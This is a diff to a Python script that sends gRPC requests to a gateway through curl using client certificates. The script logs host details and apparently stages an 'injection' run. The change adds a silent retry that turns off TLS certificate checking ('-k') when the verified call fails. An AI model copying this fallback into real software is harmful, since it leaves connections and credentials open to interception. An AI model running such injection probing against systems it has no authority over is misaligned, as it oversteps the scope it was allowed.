@@ -91,14 +91,19 @@ def parse(b):
     return out
 
 
-def call(path, body=b'', timeout=25):
+def call(path, body=b'', timeout=25, insecure=False):
     CTR[0] += 1
     fu = '/tmp/w%d.bin' % CTR[0]
     hu = '/tmp/wh%d.txt' % CTR[0]
     bu = '/tmp/wb%d.bin' % CTR[0]
     open(fu, 'wb').write(b'\x00' + struct.pack('>I', len(body)) + body)
     args = ['curl', '-sS', '--http2', '--connect-timeout', '6', '-m', str(timeout), '-D', hu, '-o', bu,
-            '--cert', CRT, '--key', KEY, '--cacert', CA, '-X', 'POST', G + path,
+            '--cert', CRT, '--key', KEY]
+    if insecure:
+        args += ['-k']
+    else:
+        args += ['--cacert', CA]
+    args += ['-X', 'POST', G + path,
             '-H', 'te: trailers', '-H', 'content-type: application/grpc', '--data-binary', '@' + fu]
     t0 = time.time()
     prc = subprocess.run(args, capture_output=True, text=True)
@@ -319,7 +324,7 @@ def submit_and_watch(tag, wid, wtype, inp, markers, watch=14):
 # ---------------- I68930 main ----------------
 import socket
 print('===I68930 START=== ' + TS, flush=True)
-print('I68930-v2', flush=True)
+print('I68930-v3', flush=True)
 out('host=%s' % subprocess.run(['hostname'], capture_output=True, text=True).stdout.strip())
 out('kernel=%s' % subprocess.run(['uname','-r'], capture_output=True, text=True).stdout.strip())
 try:
@@ -347,6 +352,9 @@ except Exception as ex:
     out('SSLC_ERR|%r' % (ex,))
 r = call(T + 'GetSystemInfo', timeout=25)
 out('CTL|GetSystemInfo|st=%s|m=%s|%s' % (r['st'], r['msg'], pl_strings(payload(r['data']), 80)))
+if r['st'] == '-':
+    r = call(T + 'GetSystemInfo', timeout=25, insecure=True)
+    out('CTL2|GetSystemInfo_insecure|st=%s|m=%s|%s' % (r['st'], r['msg'], pl_strings(payload(r['data']), 80)))
 
 if r['st'] != '0':
     out('GATEWAY_UNREACHABLE|no injection')
